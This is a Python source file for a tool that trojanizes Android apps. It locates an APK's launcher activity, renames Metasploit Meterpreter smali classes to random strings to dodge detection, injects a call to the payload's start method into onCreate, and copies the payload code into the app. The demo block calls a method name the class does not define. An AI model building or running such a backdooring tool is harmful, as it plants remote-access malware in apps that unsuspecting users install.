#!/usr/bin/python3
# -*- coding: utf-8 -*-

import random
import re
import os
import shutil
import time

from xml.dom.minidom import parse, parseString

class InjectMsf2App:
    def __init__(self, options):
        pass

    def GetInjectAppLauncherActivit(self, **kwargs):
        AndroidManifestFile = self.__ReslovePath(kwargs['androidmanifestfile'])
        with open(AndroidManifestFile, 'r') as file:
            DomXml = parse(file)
        DocumentRoot = DomXml.documentElement
        AppPackageName = DocumentRoot.getAttribute('package')
        ApplicationNoe = DocumentRoot.getElementsByTagName('application')
        LauncherActivity = ApplicationNoe[0].getAttribute("android:name")

        if LauncherActivity:
            LauncherActivity = LauncherActivity.strip()
        else:
            LauncherActivity = 'android.app.Application'
            ActivityNode = ApplicationNoe[0].getElementsByTagName('activity')
            LauncherActivity = ActivityNode[0].getAttribute("android:name").strip()

        if re.search(r'^(\w+\.)(\w+\.)+(\w+)$', LauncherActivity):
            pass
        elif re.search(r'^\.[a-zA-Z0-9]+$', LauncherActivity):
            LauncherActivity = AppPackageName + LauncherActivity
        elif re.search(r'^[a-zA-Z0-9]+$', LauncherActivity):
            LauncherActivity = AppPackageName + '.' + LauncherActivity
        else:
            # print(f"[!] 获取匹配到的首组件名称, 但是不符合规则, 请确认! 获取到的组件为: {LauncherActivity}")
            return False
        return LauncherActivity

    def GetInjectAppLauncherActivitFile(self, **kwargs):

        LauncherActivity = self.GetInjectAppLauncherActivit(**kwargs)
        AppDexPath = self.__ReslovePath(kwargs['appdexpath'])
        LauncherActivityReplace = LauncherActivity.replace('.', os.path.sep)

        MoveAppLauncherActivityClassPathS = []
        for _ in os.listdir(AppDexPath):
            AppLauncherActivityClassPath = os.path.join(AppDexPath, _)

            if os.path.isdir(AppLauncherActivityClassPath):
                MoveAppLauncherActivityClassPathS.append(_)
                AppLauncherActivitSmaliPath = os.path.join(AppLauncherActivityClassPath, f'{LauncherActivityReplace}.smali')
                if os.path.exists(AppLauncherActivitSmaliPath):
                    InjectAppLauncherActivitSmaliPath = AppLauncherActivitSmaliPath

        MoveAppLauncherActivityClassPathS.sort()
        MoveAppLauncherActivityClassPath = os.path.join(AppDexPath, MoveAppLauncherActivityClassPathS[-1])

        return LauncherActivity, MoveAppLauncherActivityClassPath, InjectAppLauncherActivitSmaliPath


    def RandomMsfSmali(self, **kwargs):
        VAR1 = self.__RandomStr()
        VAR2 = self.__RandomStr()
        VAR3 = self.__RandomStr()
        VAR4 = self.__RandomStr()
        VAR5 = self.__RandomStr()
        VAR6 = self.__RandomStr()
        VAR7 = self.__RandomStr()

        MsfSmaliPath = self.__ReslovePath(kwargs['msfsmalipath'])

        os.rename(os.path.join(MsfSmaliPath ,"com", "metasploit"), os.path.join(MsfSmaliPath, "com", VAR1))
        os.rename(os.path.join(MsfSmaliPath, "com", VAR1, "stage"), os.path.join(MsfSmaliPath, "com", VAR1, VAR2))
        os.rename(os.path.join(MsfSmaliPath, "com", VAR1, VAR2, "Payload.smali"), os.path.join(MsfSmaliPath, "com", VAR1, VAR2, f"{VAR3}.smali"))

        for smali_file in os.listdir(os.path.join(MsfSmaliPath, "com", VAR1, VAR2)):
            self.__ReplaceFleContent(r'metasploit/stage', f"{VAR1}/{VAR2}", os.path.join(MsfSmaliPath, "com", VAR1, VAR2, smali_file))
            self.__ReplaceFleContent(r'Payload', f"{VAR3}", os.path.join(MsfSmaliPath, "com", VAR1, VAR2, smali_file))

        self.__ReplaceFleContent(r'com\.metasploit\.meterpreter\.AndroidMeterpreter', f"com.{VAR4}.{VAR5}.{VAR6}", os.path.join(MsfSmaliPath, "com", VAR1, VAR2, f"{VAR3}.smali"))
        self.__ReplaceFleContent(r'payload', f"{VAR7}", os.path.join(MsfSmaliPath, "com", VAR1, VAR2, f"{VAR3}.smali"))

        return [VAR1, VAR2, VAR3]


    def InjectMsf2SmaliFile(self, **kwargs):
        VAR1 = kwargs['vars'][0]
        VAR2 = kwargs['vars'][1]
        VAR3 = kwargs['vars'][2]
        InjectAppLauncherActivitSmaliPath = self.__ReslovePath(kwargs['injectapplauncheractivitsmalipath'])

        self.__ReplaceFleContent(r"(\.method.*?onCreate\(.*?\)V)", r"\1\n    invoke-static {}, Lcom/{}/{}/{};->start(Landroid/content/Context;)V".format('{p0}', VAR1, VAR2, VAR3), InjectAppLauncherActivitSmaliPath)


        with open(InjectAppLauncherActivitSmaliPath, 'r') as file:
            data = file.read()
        res = [_ for _ in re.finditer(r"(\.method.*?onCreate\(.*?\)V)", data)]
        return data[(res[0].span()[0] - 2):(res[0].span()[1] + 120)] if len(res) > 0 else False

    def CopyMsfSmali2AppSmali(self, **kwargs):
        VAR1 = kwargs['vars'][0]

        MsfSmaliPath = self.__ReslovePath(kwargs['msfsmalipath'])
        MoveAppLauncherActivityClassPath = self.__ReslovePath(kwargs['moveapplauncheractivityclasspath'])

        try:
            shutil.copytree(os.path.join(MsfSmaliPath, "com", VAR1), os.path.join(MoveAppLauncherActivityClassPath, "com", VAR1))
            # print(f"[+] smali文件拷贝成功!")

        except Exception as e:
            # print(f"[+] smali文件拷贝失败!")
            pass

    def AddSleep(self):
        time.sleep(0)

    def __RandomStr(self):
        return ''.join(random.sample('zyxwvutsrqponmlkjihgfedcba', 10))

    def __ReplaceFleContent(self, pattern, string, rep_file):
        with open(rep_file, 'r') as file:
            data = file.read()
        data = re.sub(pattern, string, data)
        with open(rep_file, 'w') as file:
            file.write(data)


    def __ReslovePath(self, *path):
        return os.path.abspath(os.path.join(*path))

if __name__ == '__main__':
    OPTIONS = {
        'TestDir': 'WorkDir',
        'TestDirApkFile': f'WorkDir/apkfile',
        'TestDirDexFile': f'WorkDir/dexfile',
        'TestDirUnZipApkPath': f'WorkDir/apkfile/app',
        'TestDirUnZipXmlPath': f'WorkDir/apkfile/xml',
        'TestDirAppUnSmaliPath': f'WorkDir/dexfile/app',
        'TestDirMsfUnSmaliPath': f'WorkDir/dexfile/msf'
    }
    Inject = InjectMsf2App(OPTIONS)
    LauncherActivity, MoveAppLauncherActivityClassPath, InjectAppLauncherActivitSmaliPath = Inject.GetAppLauncherActivityFile(appdexpath=r'../WorkDir/dexfile/app/', androidmanifestfile=r'../WorkDir/apkfile/xml/AndroidManifest_Decode.xml')
    print(LauncherActivity, MoveAppLauncherActivityClassPath, InjectAppLauncherActivitSmaliPath)

    VARS = Inject.RandomMsfSmali(msfsmalipath=r'../WorkDir/dexfile/msf/classes/')
    print(VARS)

    Inject.InjectMsf2SmaliFile(vars=VARS, injectapplauncheractivitsmalipath=InjectAppLauncherActivitSmaliPath)
    Inject.CopyMsfSmali2AppSmali(vars=VARS, msfsmalipath=r'../WorkDir/dexfile/msf/classes/', moveapplauncheractivityclasspath=MoveAppLauncherActivityClassPath)

